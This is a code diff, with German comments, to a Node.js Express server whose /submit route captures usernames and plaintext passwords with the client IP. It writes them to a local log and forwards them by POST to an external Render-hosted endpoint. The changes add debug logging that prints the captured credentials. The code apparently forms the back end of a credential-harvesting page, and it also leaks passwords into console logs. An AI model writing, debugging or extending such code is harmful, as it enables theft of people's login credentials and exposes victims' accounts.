@@ -2,7 +2,7 @@ const express = require('express');
 const bodyParser = require('body-parser');
 const path = require('path');
 const fs = require('fs');
-const fetch = require('node-fetch');
+// const fetch = require('node-fetch'); // Nur nötig für Node <18!
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -16,6 +16,9 @@ app.post('/submit', async (req, res) => {
     const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     const { username, password } = req.body;
 
+    // Debug: Logge, was im Body ankommt
+    console.log("Request-Body:", req.body);
+
     const logData = {
       timestamp: new Date().toISOString(),
       ip: clientIp,
@@ -24,18 +27,28 @@ app.post('/submit', async (req, res) => {
       password: password
     };
 
-  
-    const renderResponse = await fetch('https://dein-render-service.onrender.com/api/log', {
+    // Debug: Was wird an Render geschickt?
+    const renderPayload = {
+      username: username,
+      password: password,
+      clientIp: clientIp
+    };
+    console.log("Sende an Render:", renderPayload);
+
+    // Nutze global fetch bei Node 18+
+    const fetchFn = globalThis.fetch || require('node-fetch');
+    const renderResponse = await fetchFn('https://dein-render-service.onrender.com/api/log', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        username: username,
-        password: password,
-        clientIp: clientIp
-      })
+      body: JSON.stringify(renderPayload)
     });
 
-    if (!renderResponse.ok) throw new Error('Render antwortete mit Fehler');
+    // Debug: Logge Render Response
+    console.log("Render Response status:", renderResponse.status);
+    if (!renderResponse.ok) {
+      const text = await renderResponse.text();
+      throw new Error('Render antwortete mit Fehler: ' + text);
+    }
 
     fs.appendFile('submissions.log', JSON.stringify(logData) + '\n', (err) => {
       if (err) console.error("Log-Fehler:", err);
